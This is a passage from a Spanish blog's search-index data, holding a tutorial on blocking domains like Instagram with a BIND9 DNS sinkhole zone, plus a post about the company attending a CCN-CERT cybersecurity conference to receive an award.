espec\u00edficos usando BIND9","text":"<p>Para bloquear dominios espec\u00edficos utilizando BIND9, podemos crear un archivo de zona personalizado que redirigir\u00e1 las consultas de aquellos dominios a una direcci\u00f3n no v\u00e1lida o inexistente, bloqueando as\u00ed el acceso. </p> <p>Aqu\u00ed tienes una gu\u00eda paso a paso:</p>"},{"location":"es/blog/posts/26-01-2025/#crear-un-archivo-de-zona-para-bloquear-dominios","title":"Crear un archivo de Zona para bloquear dominios","text":"<p>Un archivo de zona define los registros DNS para los dominios que quieras bloquear. Estos registros pueden redirigir los dominios bloqueados a un &lt;&lt;agujero negro&gt;&gt; (por ejemplo, <code>127.0.0.1</code> o <code>0.0.0.0</code>).</p> <ol> <li> <p>Cree un archivo de zona para los dominios bloqueados, por ejemplo, <code>block_instagram.zone</code>:   <pre><code>sudo nano /etc/bind/block_instagram.zone\n</code></pre></p> </li> <li> <p>A\u00f1ade lo siguiente al contenido del archivo de zona:   <pre><code>$TTL    3600\n@       IN      SOA     localhost. root.localhost. (\n                2025012601 ; Serial\n                3600       ; Refresh\n                1800       ; Retry\n                604800     ; Expire\n                86400 )    ; Minimum TTL\n        IN      NS      localhost.\n\n@       IN      A       127.0.0.1\n*       IN      A       127.0.0.1\n</code></pre></p> <ul> <li><code>127.0.0.1</code>: Redirige las consultas de los dominios bloqueados a la m\u00e1quina local, impidiendo efectivamente el acceso.</li> <li>Registro Comod\u00edn (<code>* IN A</code>): Garantiza que cualquier subdominio de los dominios bloqueados tambi\u00e9n sean redirigidos.</li> </ul> </li> </ol>"},{"location":"es/blog/posts/26-01-2025/#defina-los-dominios-bloqueados-en-namedconflocal","title":"Defina los Dominios Bloqueados en <code>named.conf.local</code>","text":"<p>Vamos a bloquear Instagram. Es necesario asociar el dominio bloqueado con el archivo de zona personalizado.</p> <ol> <li>Abre el archivo de configuraci\u00f3n de BIND9 <pre><code>sudo nano /etc/bind/named.conf.local\n</code></pre></li> <li>A\u00f1ade una entrada <code>zone</code> a cada dominio que quieras bloquear. En este caso bloquearemos instagram.com y cdninstagram.com, el dominio de la red de la distribuci\u00f3n de contenidos (CDN) de Instagram que se utiliza para servir im\u00e1genes y videos: <pre><code>zone \"instagram.com\" {\n    type master;\n    file \"/etc/bind/block_instagram.zone\";\n};\n\nzone \"cdninstagram.com\" {\n    type master;\n    file \"/etc/bind/block_instagram.zone\";\n};\n</code></pre></li> </ol>"},{"location":"es/blog/posts/26-01-2025/#recargar-la-configuracion-de-bind9","title":"Recargar la Configuraci\u00f3n de BIND9","text":"<p>Una vez que hayas creado el archivo de zona y actualizado la configuraci\u00f3n, recarga el servicio BIND9 para aplicar los cambios.</p> <ol> <li> <p>Comprueba si hay errores en la configuraci\u00f3n: <pre><code>sudo named-checkconf\n</code></pre></p> </li> <li> <p>Recarga el servicio BIND9: <pre><code>sudo systemctl reload bind9\n</code></pre></p> </li> </ol>"},{"location":"es/blog/posts/26-01-2025/#prueba-la-configuracion","title":"Prueba la Configuraci\u00f3n","text":"<p>Para verificar que los dominios bloqueados funcionan como se espera:</p> <ol> <li> <p>Utiliza el comando <code>dig</code> para consultar el dominio bloqueado: <pre><code>dig instagram.com.\n</code></pre></p> <ul> <li>La respuesta deber\u00eda de devolver <code>127.0.0.1</code>.</li> </ul> </li> <li> <p>Intente acceder al dominio bloqueado desde el navegador. No deber\u00eda de cargarse.</p> </li> </ol> Instagram no est\u00e1 Disponible <p>Al crear un archivo de zona personalizado y asociarlo a los dominios que deseas bloquear, obtenemos un control total sobre las restricci\u00f3n de acceso a ciertos sitios web. Esta configuraci\u00f3n nos permite:</p> <ul> <li>Mejorar la seguridad bloqueando dominios maliciosos conocidos.</li> <li>Personalizar el servidor DNS para satisfacer los requisitos espec\u00edficos de la red.</li> </ul>"},{"location":"es/blog/posts/26-01-2025/#conclusion","title":"Conclusion","text":"<p>Ahora, ya sabes como bloquear cualquier dominio al que no quieras que accedan tus familiares o los usuarios de la red. Ya sea para limitar el acceso a las redes sociales para ayudar a tus hijos a concentrarse, para mejorar la seguridad bloqueando sitios web maliciosos o simplemente para tener control de tu propia red, ahora tienes las herramientas para conseguirlo.</p> <p>Este ejemplo se realiz\u00f3 en un port\u00e1til local, pero no tiene porque detenerse ah\u00ed. Puedes implementar la misma configuraci\u00f3n a nivel de router o usar una Raspberry Pi como tu servidor DNS primario. De esta manera, puedes aplicar estas reglas a toda tu red, garantizando que todos los dispositivos conectados siguen tus restricciones personalizadas.</p> <p>Con este enfoque, no solo est\u00e1s gestionando un servidor DNS, est\u00e1s creando un entorno digital m\u00e1s seguro y productivo para todos los miembros de tu red.</p>"},{"location":"es/blog/posts/30-11-2024/","title":"XVIII Jornadas STIC CCN-CERT | VI Jornadas de Ciberdefensa ESPDEF-CERT","text":"<p>El pasado Martes, tuvimos el honor de asistir a la XVIII Jornadas STIC CCN-CERT | VI Jornadas de Ciberdefensa ESPDEF-CERT, celebradas en los cines Kin\u00e9polis de la Ciudad de la Imagen en Madrid. El prop\u00f3sito principal de este viaje fue recibir un premio concedido a nuestro equipo de ciberseguridad, que result\u00f3 ganador de una competici\u00f3n nacional organizada por la Universidad de Granada en colaboraci\u00f3n con El Mando Conjunto del Ciberespacio (MCCE) y el Instituto Nacional de Ciberseguridad (INCIBE). Este reconocimiento no solo nos llena de orgullo, si no que tambi\u00e9n refuerza nuestro compromiso con las nuevas generaciones y nuestra confianza en el inmenso talento de estos j\u00f3venes profesionales.</p> <p>Adem\u00e1s, aprovechamos nuestro tiempo en este importante evento para empezar a hacernos un hueco en el sector, estableciendo conexiones con otras empresas, aprendiendo de las experiencias y siendo asesorados por organizaciones l\u00edderes en el panorama tecnol\u00f3gico tanto a nivel nacional como internacional.</p> <p>Estamos convencidos de que este es el camino correcto, y salimos de Madrid con un gran entusiasmo para ayudar a todas las empresas que conf\u00edan en nosotros para alcanzar la excelencia.</p> <p>#XVIIIJORNADASCCNCERT #VIJORNADASESPDEFCERT</p> Nuestro equipo en el photocall"}]}